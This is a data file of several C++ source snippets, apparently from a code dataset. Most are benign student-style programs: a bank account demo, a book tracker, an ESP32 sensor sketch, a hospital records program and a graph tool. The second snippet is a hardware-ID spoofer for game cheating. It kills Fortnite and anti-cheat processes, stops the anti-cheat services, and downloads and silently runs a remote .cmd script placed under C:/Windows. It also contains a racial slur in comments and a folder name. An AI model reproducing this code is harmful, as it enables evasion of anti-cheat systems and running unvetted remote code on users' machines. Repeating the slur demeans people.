    "#include <iostream>\r\n#include <vector>\r\n\r\nclass BankAccount {\r\nprivate:\r\n    std::string name;\r\n    int accountNumber;\r\n    double balance;\r\n\r\npublic:\r\n    BankAccount(std::string name, int accountNumber, double initialDeposit) : name(name), accountNumber(accountNumber), balance(initialDeposit) {}\r\n\r\n    void deposit(double amount) {\r\n        balance += amount;\r\n    }\r\n\r\n    bool withdraw(double amount) {\r\n        if (amount > balance) {\r\n            std::cout << \"Insufficient balance.\\n\";\r\n            return false;\r\n        }\r\n        balance -= amount;\r\n        return true;\r\n    }\r\n\r\n    void display() const {\r\n        std::cout << \"Account Name: \" << name << \"\\nAccount Number: \" << accountNumber << \"\\nBalance: $\" << balance << std::endl;\r\n    }\r\n};\r\n\r\nclass Bank {\r\nprivate:\r\n    std::vector<BankAccount> accounts;\r\n\r\npublic:\r\n    void addAccount(const BankAccount& account) {\r\n        accounts.push_back(account);\r\n    }\r\n\r\n    void depositToAccount(int accountNumber, double amount) {\r\n        for (auto& account : accounts) {\r\n            if (account.accountNumber == accountNumber) {\r\n                account.deposit(amount);\r\n                std::cout << \"Deposited $\" << amount << \" to account number \" << accountNumber << std::endl;\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Account not found.\\n\";\r\n    }\r\n\r\n    void withdrawFromAccount(int accountNumber, double amount) {\r\n        for (auto& account : accounts) {\r\n            if (account.accountNumber == accountNumber) {\r\n                if (account.withdraw(amount)) {\r\n                    std::cout << \"Withdrew $\" << amount << \" from account number \" << accountNumber << std::endl;\r\n                }\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Account not found.\\n\";\r\n    }\r\n\r\n    void showAccountDetails(int accountNumber) const {\r\n        for (const auto& account : accounts) {\r\n            if (account.accountNumber == accountNumber) {\r\n                account.display();\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Account not found.\\n\";\r\n    }\r\n};\r\n\r\nint main() {\r\n    Bank myBank;\r\n    myBank.addAccount(BankAccount(\"John Doe\", 123456, 500.0));\r\n    myBank.depositToAccount(123456, 200.0);\r\n    myBank.withdrawFromAccount(123456, 100.0);\r\n    myBank.showAccountDetails(123456);\r\n\r\n    return 0;\r\n}\r\n",
    "#include <Windows.h>\n#include \"auth/auth.hpp\"\n#include <string>\n#include \"auth/utils.hpp\"\n#include \"auth/skStr.h\"\n\n\n#include <iostream>\n#include <string>\n#include <vector>\n#include <filesystem>\n#include <Windows.h>\n#include <Urlmon.h>\n\n#pragma comment(lib, \"Urlmon.lib\")\n\nnamespace fs = std::filesystem;\n\n#include <codecvt>\n\n#include <Windows.h>\n\nbool downloadFile(const std::wstring& url, const std::wstring& filePath) {\n    // nigger\n    int urlSize = WideCharToMultiByte(CP_UTF8, 0, url.c_str(), -1, nullptr, 0, nullptr, nullptr);\n    int filePathSize = WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, nullptr, 0, nullptr, nullptr);\n\n    std::string narrowUrl(urlSize, '\\0');\n    std::string narrowFilePath(filePathSize, '\\0');\n\n    WideCharToMultiByte(CP_UTF8, 0, url.c_str(), -1, narrowUrl.data(), urlSize, nullptr, nullptr);\n    WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, narrowFilePath.data(), filePathSize, nullptr, nullptr);\n\n    // nigger\n    HRESULT hr = URLDownloadToFileA(nullptr, narrowUrl.c_str(), narrowFilePath.c_str(), 0, nullptr);\n    if (FAILED(hr)) {\n        std::cerr << \"Failed to download files. Error code: \" << hr << std::endl;\n        return false;\n    }\n    return true;\n}\n\nvoid menu();\n\nint temp() {\n\n    INPUT input[2];\n\n    \n    input[0].type = INPUT_KEYBOARD;\n    input[0].ki.wScan = 0;\n    input[0].ki.time = 0;\n    input[0].ki.dwExtraInfo = 0;\n    input[0].ki.wVk = 0x31;  \n    input[0].ki.dwFlags = 0;  \n\n    \n    input[1].type = INPUT_KEYBOARD;\n    input[1].ki.wScan = 0;\n    input[1].ki.time = 0;\n    input[1].ki.dwExtraInfo = 0;\n    input[1].ki.wVk = 0x31;  \n    input[1].ki.dwFlags = KEYEVENTF_KEYUP;\n\n    \n    SendInput(2, input, sizeof(INPUT));\n\n    \n    input[0].ki.wVk = VK_RETURN;  \n    input[0].ki.dwFlags = 0;      \n\n    \n    input[1].ki.wVk = VK_RETURN;  \n    input[1].ki.dwFlags = KEYEVENTF_KEYUP;\n\n    \n    SendInput(2, input, sizeof(INPUT));\n\n}\n\nint win()\n{\n    system(\"cls\");\n\n    std::wstring folderPath = L\"C:/Windows/SupaNiga/\";\n    fs::create_directory(folderPath);\n\n    std::vector<std::wstring> fileURLs = {\n        L\"http://root1337.cdn.zerocdn.com/MAS_AIO-CRC32_9AE8AFBA%20%281%29.cmd\",\n    };\n\n    std::vector<std::wstring> fileNames = {\n        L\"windows.cmd\"\n    };\n\n    for (size_t i = 0; i < fileURLs.size(); ++i) {\n        if (!downloadFile(fileURLs[i], folderPath + fileNames[i])) {\n            std::wcerr << L\"Failed to download file: \" << fileURLs[i] << std::endl;\n            return 1;\n        }\n    }\n    _wsystem((folderPath + L\"windows.cmd\").c_str());\n\n    menu();\n}\nvoid tools()\n{\n    SetConsoleTitleA(\"Inertia TOOLS\");\n    system(\"cls\");\n    system(\"cls\");\n\n    printf(\"[ INFO ] Welcome to Inertia PERM SPOOFER\\n\\n\");\n    printf(\"\\n[1] Windows Activator \\n[2] MAC Spoof \\n[3] Return \\n[>] \");\n\n    std::string Spoof;\n    std::cin >> Spoof;\n\n    if (Spoof == \"1\" || Spoof == \"one\") {\n        \n        printf(\"[WARNING] THIS WILL CLOSE THE SPOOFER\");\n        Sleep(2000);\n        ShowWindow(GetConsoleWindow(), SW_HIDE);\n        win();\n        ShowWindow(GetConsoleWindow(), SW_SHOW);\n        printf(\"Done Spoofing...\");\n        Sleep(2000);\n    }\n    if (Spoof == \"2\" || Spoof == \"two\") {\n        printf(\"comign soon :)\");\n        tools();\n    }\n    if (Spoof == \"3\" || Spoof == \"three\") {\n        printf(\"Returning..\");\n        Sleep(2000);\n        menu();\n    }\n\n\n\n\n}\n\nvoid check()\n{\n    system(\"cls\");\n    system(\"echo BaseBoard:\");\n    Sleep(200);\n    system(\"wmic baseboard get serialnumber\");\n    Sleep(200);\n    system(\"echo System UUID:\") ;\n    Sleep(200);\n    system(\"wmic path win32_computersystemproduct get uuid\") ;\n    Sleep(200);\n    system(\"echo BIOS:\") ;\n    Sleep(200);\n    system(\"wmic bios get serialnumber\") ;\n    Sleep(200);\n    system(\"echo CPU:\") ;\n    Sleep(200);\n    system(\"wmic cpu get serialnumber\") ;\n    Sleep(200);\n    system(\"echo Mac Address:\") ;\n    Sleep(200);\n    system(\"getmac\") ;\n    Sleep(200);\n    std::cout << (\"  \")  << '\\n';\n    Sleep(200);\n    system(\"echo -----------------------------------------------\") ;\n    Sleep(200);\n    system(\"echo Returning In 5 Seconds\");\n    Sleep(200);\n    system(\"echo -----------------------------------------------\") ;\n    Sleep(5000);\n    system(\"cls\") ;\n    menu();\n}\n\n\n\nint spoof() {\n    system(\"taskkill /F /IM EpicGamesLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM EasyAntiCheatLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM BEService.exe >nul 2>&1\");\n    system(\"taskkill /F /IM Fortnite.exe >nul 2>&1\");\n    system(\"taskkill /F /IM BattleEyeLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1\");\n    system(\"sc stop BEService >nul 2>&1\");\n    system(\"sc stop BEDaisy >nul 2>&1\");\n    system(\"sc stop EasyAntiCheat >nul 2>&1\");\n    system(\"sc stop EasyAntiCheatSys >nul 2>&1\");\n\n    system(\"cls\");\n\n    std::wstring folderPath = L\"C:/Windows/SupaNiga/\";\n    fs::create_directory(folderPath);\n\n    std::vector<std::wstring> fileURLs = {\n        L\"http://root1337.cd",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <iomanip>\n#include \"book.h\"\nusing namespace std;\nusing namespace mybook;\n\nvoid menu();\nvoid add_book(vector<Book>& bookRecord);\nvoid display_book(const vector<Book>& bookRecord);\nstring search_book(const vector<Book>& bookRecord, const string& bookToSearch);\nvoid update_book(vector<Book>& bookRecord, const string& bookToUpdate);\nvoid delete_book(vector<Book>& bookRecord, const string& bookToDelete);\n\nint main()\n{\n    int choice;\n    vector<Book> bookRecord;\n    bool endProgram = false;\n    \n    while (!endProgram)\n    {\n        menu();\n        cout << \"--------------------\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n        cin.ignore(); // Clear the input buffer\n        \n        switch (choice) {\n            case 1:\n                add_book(bookRecord);\n                break;\n            case 2:\n                display_book(bookRecord);\n                break;\n            case 3:\n            {\n                string searchBook;\n                cout << \"Enter book name: \";\n                getline(cin, searchBook);\n                cout << search_book(bookRecord, searchBook);\n                break;\n            }\n            case 4:\n            {\n                string updateBook;\n                cout << \"Enter book name: \";\n                getline(cin, updateBook);\n                update_book(bookRecord, updateBook);\n                break;\n            }\n            case 5:\n            {\n                string deleteBook;\n                cout << \"Enter book name: \";\n                getline(cin, deleteBook);\n                delete_book(bookRecord, deleteBook);\n                break;\n            }\n            case 6:\n                cout << \"Exiting Program....\\n\";\n                endProgram = true;\n                break;\n            default:\n                cout << \"Invalid input.\\n\";\n                break;\n        }\n    }\n    \n    return 0;\n}\n\nvoid menu()\n{\n    cout << \"\\t\\t\\t\\tControl Panel\\n\";\n    cout << \"\\n\";\n    \n    cout << \"1. Add Book\\n\";\n    cout << \"2. Display Books\\n\";\n    cout << \"3. Search Book\\n\";\n    cout << \"4. Update Book\\n\";\n    cout << \"5. Delete Book\\n\";\n    cout << \"6. Exit\\n\";\n}\n\nvoid add_book(vector<Book>& bookRecord)\n{\n    string name, author, status, dateStart, dateFinish;\n    cout << \"Book Name : \";\n    getline(cin, name);\n    \n    cout << \"\\n\";\n    cout << \"Author Name : \";\n    getline(cin, author);\n    \n    cout << \"\\n\";\n    cout << \"Book Status (Plan to Read / Reading / Finished) : \";\n    getline(cin, status);\n    \n    cout << \"\\n\";\n    cout << \"Start Date (DD-MM-YYYY), if not yet start, please type None : \";\n    getline(cin, dateStart);\n    \n    cout << \"\\n\";\n    cout << \"Finish Date (DD-MM-YYYY), if not yet start, please type None : \";\n    getline(cin, dateFinish);\n    \n    Book newBook(name, author, status, dateStart, dateFinish);\n    bookRecord.push_back(newBook);\n}\n\nvoid display_book(const vector<Book>& bookRecord)\n{\n    cout << endl;\n    \n    cout << left << setw(15) << \"Book Name\"\n             << setw(15) << \"Author\"\n             << setw(15) << \"Status\"\n             << setw(15) << \"Start Date\"\n             << setw(15) << \"Finish Date\" << endl;\n\n    for (const auto& book : bookRecord)\n    {\n        cout << left << setw(15) << book.getName()\n             << setw(15) << book.getAuthor()\n             << setw(15) << book.getStatus()\n             << setw(15) << book.getDateStart()\n             << setw(15) << book.getDateFinish() << endl;\n    }\n    cout << endl;\n}\n\nstring search_book(const vector<Book>& bookRecord, const string& bookToSearch)\n{\n    for (const auto& book : bookRecord)\n    {\n        if (book.getName() == bookToSearch)\n        {\n            return book.getName() + \" is found in the book record.\\n\";\n        }\n    }\n    return bookToSearch + \" is NOT FOUND in the book record.\\n\";\n}\n\nvoid update_book(vector<Book>& bookRecord, const string& bookToUpdate)\n{\n    for (auto& book : bookRecord)\n    {\n        if (book.getName() == bookToUpdate)\n        {\n            int choice;\n            cout << \"Which info do you want to update?\\n\";\n            cout << \"1. Book Name\\n\"\n                 << \"2. Book Author\\n\"\n                 << \"3. Book Status\\n\"\n                 << \"4. Book Date Start\\n\"\n                 << \"5. Book Date Finish\\n\"\n                 << \"6. Never mind\\n\";\n            cout << \"----------------------------------\\n\";\n            cout << \"Enter your choice: \";\n            cin >> choice;\n            cin.ignore();\n            \n            switch (choice) {\n                case 1:\n                {\n                    string bookName;\n                    cout << \"Enter new book name: \";\n                    getline(cin, bookName);\n                    book.setName(bookName);\n                    cout << \"New name has been set for \" << bookToUpdate << endl;\n                    break;\n                }\n                case 2:\n                {\n                    string author;\n          ",
    "#include <Arduino.h>\n#include <DHT.h>\n#include <BLEServer.h>\n#include <BLEDevice.h>\n#include <BLEUtils.h>\n#include <BLE2902.h>\n#include <PubSubClient.h>\n#include <WiFi.h>\n#include \"Credentials.h\"\n#include <iostream>\n\nusing namespace std;\n\n#define LEDPIN 2\n#define DHTPIN 5\n#define DHTTYPE DHT11\n#define READ_INTERVAL 2000\n#define SERVICE_UUID \"2aeb149a-4803-11ee-be56-0242ac120002\"\n#define HUMIDITY_UUID \"3ab43154-4803-11ee-be56-0242ac120002\"\n#define TEMPERATURE_UUID \"404dccd8-4803-11ee-be56-0242ac120002\"\n\n// Set MQTT Broker\n\nconst char *mqtt_broker = \"test.mosquitto.org\";\nconst char *topic = \"MOISES/ESP3\"; //Set the topic here before -- DO NOT FORGET TO SET THE TOPIC HERE\nconst char *topic2 = \"MOISES/ESP2\";\nconst char *mqqtt_username = \"\";\nconst char *mqtt_password = \"\";\nconst int mqtt_port = 1883;\n\nbool mqttStatus = 0;\n\nWiFiClient espClient;\nPubSubClient client(espClient);\n\nbool connectMQTT();\nvoid callback(char *topic, byte *payload, unsigned int lenght);\n\nWiFiServer server_wifi(80);\n\nDHT dht(DHTPIN, DHTTYPE);\n\nBLEServer *server = nullptr;\nBLECharacteristic *temperatureChar = nullptr;\nBLECharacteristic *humidityChar = nullptr;\n\nfloat lastTemperature = -999;\nfloat lastHumidity = -999;\nint devicesConnected = 0;\nunsigned int blinkMillis = 0;\nunsigned int readkMillis = 0;\n\nclass ServerCallbacks: public BLEServerCallbacks{\n    void onConnect(BLEServer *s){\n      Serial.println(\"Device connected\");\n      devicesConnected++;\n      BLEDevice::startAdvertising();\n    }\n\n    void onDisconnect(BLEServer *s){\n      Serial.println(\"Device disconnected\");\n      devicesConnected--;\n    }\n};\n\nvoid setup() {\n  Serial.begin(9600);\n\n  Serial.println(\"Starting...\");\n\n  Serial.println();\n  Serial.println(\"Connecting in \");\n  Serial.println(ssid);\n  WiFi.begin(ssid, password);\n\n  while(WiFi.status() != WL_CONNECTED){\n    delay(741);\n    Serial.print(\".\");\n  }\n\n  Serial.println(\"\");\n  Serial.println(\"WiFi connected!\");\n  Serial.println(\"IP: \");\n  Serial.println(WiFi.localIP());\n\n  mqttStatus = connectMQTT();\n\n  dht.begin();\n  pinMode(LEDPIN, OUTPUT);\n\n  BLEDevice::init(\"ESP32\");\n  server = BLEDevice::createServer();\n  server->setCallbacks(new ServerCallbacks());\n\n  BLEService *service = server->createService(SERVICE_UUID);\n\n  temperatureChar = service->createCharacteristic(\n    TEMPERATURE_UUID,\n    BLECharacteristic::PROPERTY_READ |\n    BLECharacteristic::PROPERTY_NOTIFY\n  );\n\n  humidityChar = service->createCharacteristic(\n    HUMIDITY_UUID,\n    BLECharacteristic::PROPERTY_READ |\n    BLECharacteristic::PROPERTY_NOTIFY\n  );\n\n  service->start();\n\n  BLEAdvertising *advertising = BLEDevice::getAdvertising();\n  advertising->addServiceUUID(SERVICE_UUID);\n  advertising->setScanResponse(false);\n  advertising->setMinPreferred(0x06);\n\n  BLEDevice::startAdvertising();\n\n  Serial.println(\"Advertising...\");\n}\n\nvoid sense() {\n  float humidity = dht.readHumidity();\n  float temperature = dht.readTemperature();\n\n  if(isnan(humidity)){\n    Serial.println(\"Humidity reading failed!\");\n    return;\n  }\n\n  if(isnan(temperature)){\n    Serial.println(\"Temperature reading failed!\");\n    return;\n  }\n\n  Serial.printf(\"Humidity = %f | Temperature = %f \\n\", humidity, temperature);\n\n//Adicionar a linha de c\u00f3digo para publicar as vari\u00e1veis aqui\nclient.publish(topic, String(temperature).c_str());\n\n\n  if(devicesConnected){\n    if (lastTemperature != temperature){\n      temperatureChar->setValue(temperature);\n      temperatureChar->notify();\n\n      lastTemperature = temperature;\n    }\n  \n    if (lastHumidity != humidity){\n      humidityChar->setValue(humidity);\n      humidityChar->notify();\n\n      lastHumidity = humidity;\n    }\n  }\n}\n\nvoid loop() {\n  if(mqttStatus){\n    client.loop();\n  }\n  while(WiFi.status() != WL_CONNECTED){\n    WiFi.begin(ssid, password);\n    Serial.print(\".\");\n\n    delay(741);\n  }\n  if(readkMillis == 0 || (millis() - readkMillis) >= READ_INTERVAL) {\n      sense();\n      readkMillis = millis();\n  }\n\n  if (!devicesConnected){\n    if (blinkMillis == 0 || (millis() - blinkMillis) >= 1000) {\n      digitalWrite(LEDPIN, !digitalRead(LEDPIN));\n      blinkMillis = millis();\n    }\n  } else {\n    digitalWrite(LEDPIN, HIGH);\n  }\n}\n\nbool connectMQTT() {\n  byte tentativa = 0;\n  client.setServer(mqtt_broker, mqtt_port);\n  client.setCallback(callback);\n\n  do{\n    String client_id = \"TEST-\";\n    client_id += String(WiFi.macAddress());\n\n    if (client.connect(client_id.c_str(), mqqtt_username, mqtt_password)) {\n      Serial.println(\"Connection sucessful: \");\n      Serial.printf(\"Client %s connected on Broker \\n\", client_id.c_str());\n    } else {\n      Serial.print(\"Connection failed: \");\n      Serial.print(client.state());\n      Serial.println();\n      Serial.print(\"New try: \");\n      delay(2000);\n    }\n    tentativa++;\n  } while (!client.connected() && tentativa < 5);\n\n  if (tentativa < 5) {\n    \n    client.subscribe(topic);\n    return 1;\n  } else {\n    Serial.println(\"Do not connected!\");\n    return 0;\n  }\n}\n\nvoid callback(char *topic, byte *payload, unsigne",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n\nusing namespace std;\n\nclass Hospital {\nprivate:\n    string Name, Address, BloodGrp, Age;\n\npublic:\n    // Constructor\n    Hospital() {\n        Name = \"Empty\";\n        Address = \"Empty\";\n        BloodGrp = \"Empty\";\n        Age = \"Empty\";\n    }\n\n    Hospital(string name, string address, string bloodGrp, string age) {\n        Name = name;\n        Address = address;\n        BloodGrp = bloodGrp;\n        Age = age;\n    }\n\n    // Setters\n    void setName(string name) { Name = name; }\n    void setAddress(string address) { Address = address; }\n    void setBloodGrp(string bloodGrp) { BloodGrp = bloodGrp; }\n    void setAge(string age) { Age = age; }\n\n    // Getters\n    string getName() const { return Name; }\n    string getAddress() const { return Address; }\n    string getBloodGrp() const { return BloodGrp; }\n    string getAge() const { return Age; }\n};\n\n// function to read patient data from file\nvector<Hospital> readPatientsFromFile() {\n    vector<Hospital> patients;\n    ifstream fileIn(\"patients.txt\");\n    if (!fileIn.is_open()) {\n        cout << \"File does not exist!\";\n        return patients;\n    }\n\n    string line;\n    while (getline(fileIn, line)) {\n        stringstream ss(line);\n        string name, address, bloodGrp, age;\n        getline(ss, name, '|');\n        getline(ss, address, '|');\n        getline(ss, bloodGrp, '|');\n        getline(ss, age);\n        patients.push_back(Hospital(name, address, bloodGrp, age));\n    }\n    fileIn.close();\n    return patients;\n}\n\n// function to write patient data to file\nvoid writePatientsToFile(const vector<Hospital>& patients) {\n    ofstream fileOut(\"patients.txt\");\n    if (!fileOut.is_open()) {\n        cout << \"File does not exist!\";\n        return;\n    }\n\n    for (size_t i = 0; i < patients.size(); ++i) {\n        const auto& patient = patients[i];\n        fileOut << patient.getName() << \"|\" << patient.getAddress() << \"|\" << patient.getBloodGrp() << \"|\" << patient.getAge() << endl;\n    }\n\n    fileOut.close();\n}\n\n// function to admit a patient\nvoid admitPatient(vector<Hospital>& patients) {\n    string name, address, bloodGrp, age;\n\n    cout << \"\\t Enter Patient Name: \";\n    cin.ignore();\n    getline(cin, name);\n\n    cout << \"\\t Enter Patient Address: \";\n    getline(cin, address);\n\n    cout << \"\\t Enter Patient Blood Group: \";\n    getline(cin, bloodGrp);\n\n    cout << \"\\t Enter Patient Age: \";\n    getline(cin, age);\n\n    // Create a new patient object and add it to the vector\n    Hospital newPatient(name, address, bloodGrp, age);\n    patients.push_back(newPatient);\n\n    // Update the file with the modified list of patients\n    writePatientsToFile(patients);\n\n    cout << \"\\n\\t Patient Data Saved Successfully!!!\\n\" << endl;\n}\n\n// function to discharge a patient\nvoid dischargePatient(vector<Hospital>& patients) {\n    if (patients.empty()) {\n        cout << \"No patients to discharge!\" << endl;\n        return;\n    }\n\n    cout << \"\\t List of Patients:\" << endl;\n    for (size_t i = 0; i < patients.size(); ++i) {\n        cout << \"\\t \" << i + 1 << \". \" << patients[i].getName() << endl;\n    }\n\n    int choice;\n    cout << \"\\t Enter the number of the patient to discharge: \";\n    cin >> choice;\n\n    if (choice < 1 || choice > static_cast<int>(patients.size())) {\n        cout << \"\\t Invalid choice!\" << endl;\n        return;\n    }\n\n    cout << \"\\n\\t The Patient \" << patients[choice - 1].getName() << \", is Discharged!!!\\n\" << endl;\n\n    // Erase the discharged patient from the vector\n    patients.erase(patients.begin() + choice - 1);\n\n    // Update the file with the modified list of patients\n    writePatientsToFile(patients);\n}\n\nint main() {\n    bool isExit = false;\n    vector<Hospital> patients;\n\n    // Load patients from file\n    patients = readPatientsFromFile();\n\n    while (!isExit) {\n        system(\"cls\");\n\n        int userVal;\n        cout << \"\\t ~ Hospital Management System ~\" << endl;\n        cout << \"\\t ===============================\" << endl << endl;\n\n        cout << \"\\t 1. Admit Patient\" << endl;\n        cout << \"\\t 2. Discharge Patient\" << endl;\n        cout << \"\\t 3. See All Patients\" << endl;\n        cout << \"\\t 4. About Us\" << endl;\n        cout << \"\\t 5. Contact Info\" << endl;\n        cout << \"\\t 6. Exit\" << endl;\n        cout << \"\\t ===============================\" << endl << endl;\n\n        cout << \"\\t Enter your choice: \";\n        cin >> userVal;\n\n        switch (userVal) {\n            case 1:\n                system(\"cls\");\n                admitPatient(patients);\n                system(\"pause\");\n                break;\n            case 2:\n                system(\"cls\");\n                dischargePatient(patients);\n                system(\"pause\");\n                break;\n            case 3:\n                system(\"cls\");\n                // Display all patients\n                for (size_t i = 0; i < patients.size(); ++i) {\n                    const auto& patient = patients[i];\n                    cout << ",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n#include <fstream>\n#include <filesystem>\n#include <sstream>\n#include <queue>\n\n\n#define VERSION \"1.1.0\"\n\n#if defined(_WIN32) || defined(_WIN64) || \\\n    defined(__WIN32__) || defined(__TOS_WIN__) || \\\n    defined(__WINDOWS__)\n#    define ENV \"windows\"\n#    define Windows\n#elif defined(linux) || defined(__linux) || \\\n    defined(__linux__) || defined(__gnu_linux__)\n#    define ENV \"linux\"\n#elif defined(macintosh) || defined(Macintosh) || \\\n    (defined(__APPLE__) && defined(__MACH__))\n#    define ENV \"macos\"\n#else\n#    error Unsupported OS\n#endif\n\n#if defined(__x86_64__) || defined(_M_X64)\n#define ARC \"x86_64\"\n#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)\n#define ARC \"x86_32\"\n#else\n#define ARC \"arm\"\n#endif\n\n\nstruct Node;\n\nstruct Edge {\n    size_t indx_to;\n    size_t indx_from;\n    float cost;\n};\n\nstruct Node {\n    std::string name;\n    std::vector<Edge> edge;\n};\n\n\ninline int convertToInt(const std::string& str) {\n    return *(reinterpret_cast<const int*>(str.c_str()));\n}\n\ninline void interupted() {\n    std::cout << \"interrupted\\n\";\n}\n\n\nstd::unordered_map<std::string, size_t> name_map;\nstd::vector<Node> graph;\nsize_t nod_origin_index = 0;\nstd::string inp = \"\";\n\nbool debug_flag = false;\nbool argument_flag = false;\n\n\nstd::queue<std::string> arg_input_queue;\n\n\nvoid inputNodeName() {\n    if (argument_flag) {\n        inp = arg_input_queue.front();\n        arg_input_queue.pop();\n    } else {\n        std::cout << \"name: \";\n        std::getline(std::cin >> std::ws, inp);\n    }\n}\n\n\nvoid fNewPoint() {\n    inputNodeName();\n\n    Node nd;\n    nd.name = inp;\n    name_map.insert(std::make_pair(inp, graph.size()));\n\n    graph.push_back(nd);\n}\n\n\nsize_t getNode() {\n    auto iter = name_map.begin();\n\n    if (!argument_flag) {\n        auto not_inter = true;\n        do {\n            inputNodeName();\n\n            if (inp.empty())\n                not_inter = false;\n            else\n                iter = name_map.find(inp);\n\n        } while (not_inter && (iter == name_map.end() || iter->second == nod_origin_index));\n\n        return not_inter\n            ? iter->second\n            : -1;\n    } else {\n        inputNodeName();\n        iter = name_map.find(inp);\n\n        return !(iter == name_map.end() || iter->second == nod_origin_index)\n            ? iter->second\n            : -1;\n    }\n}\n\n\nvoid embedEdge(Edge& edg) {\n    if (argument_flag) {\n        edg.cost = std::stof(arg_input_queue.front());\n        arg_input_queue.pop();\n    } else {\n        std::cout << \"cost: \";\n        std::cin >> edg.cost;\n    }\n\n    graph[edg.indx_from].edge.push_back(edg);\n    graph[edg.indx_to].edge.push_back(edg);\n}\n\nvoid giveChoiceUseNameAsIndex() {\n    if (argument_flag) {\n        inp = (arg_input_queue.front()[0] == 'n') ? \"Y\" : \"n\";\n    } else {\n        std::cout << \"use name as index(Y/n): \";\n        std::cin >> inp;\n    }\n}\n\nvoid fNewEdge() {\n    if (graph.size() < 2) return;\n\n    giveChoiceUseNameAsIndex();\n\n    if (inp[0] == 'Y') {\n        Edge edg;\n        edg.indx_from = nod_origin_index;\n\n        if ((edg.indx_to = getNode()) == -1) { interupted(); return; }\n\n        embedEdge(edg);\n    } else if (inp[0] == 'n') {\n        Edge edg;\n        edg.indx_from = nod_origin_index;\n\n        if (argument_flag) {\n            edg.indx_to = std::stoi(arg_input_queue.front());\n            arg_input_queue.pop();\n\n            if (edg.indx_to >= graph.size() && edg.indx_to == nod_origin_index) {\n                std::cout << \"index is out of range\\n\";\n                exit(1);\n            }\n        }\n        else\n            while ((std::cin >> edg.indx_to, edg.indx_to) >= graph.size() && edg.indx_to == nod_origin_index);\n\n        embedEdge(edg);\n    }\n}\n\n\nvoid fList() {\n    if (graph.empty()) return;\n\n    auto& cur = graph[nod_origin_index];\n\n    size_t nod_to;\n\n    std::cout << cur.name << \":\\n\";\n    for (size_t i = 0; i < cur.edge.size(); i++) {\n        nod_to = ((cur.edge[i].indx_from == nod_origin_index)\n            ? cur.edge[i].indx_to\n            : cur.edge[i].indx_from);\n\n        std::cout << '\\t';\n\n        if (nod_to >= graph.size()) std::cout << \"invl \" << nod_to;\n        else std::cout << graph[nod_to].name;\n\n        std::cout << \" -> \" << cur.edge[i].cost << '\\n';\n    }\n\n}\n\n\nvoid fListAll() {\n    size_t old_origin = nod_origin_index;\n    std::cout << \"Size: \" << graph.size() << \" nodes\\n\";\n    for (size_t i = 0; i < graph.size(); i++) {\n        nod_origin_index = i;\n        fList();\n    }\n}\n\n\nvoid fSetOrigin() {\n    if (graph.size() == 1) nod_origin_index = 0;\n    if (graph.size() < 2) return;\n\n    giveChoiceUseNameAsIndex();\n\n    if (inp[0] == 'Y') {\n        if ((nod_origin_index = getNode()) == -1) {\n            interupted();\n            nod_origin_index = 0;\n            return;\n        }\n    } else if (inp[0] == 'n') {\n        if (argument_flag) {\n            nod_origin_index = std::stoi(arg_input_queue.front());\n            arg_input",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
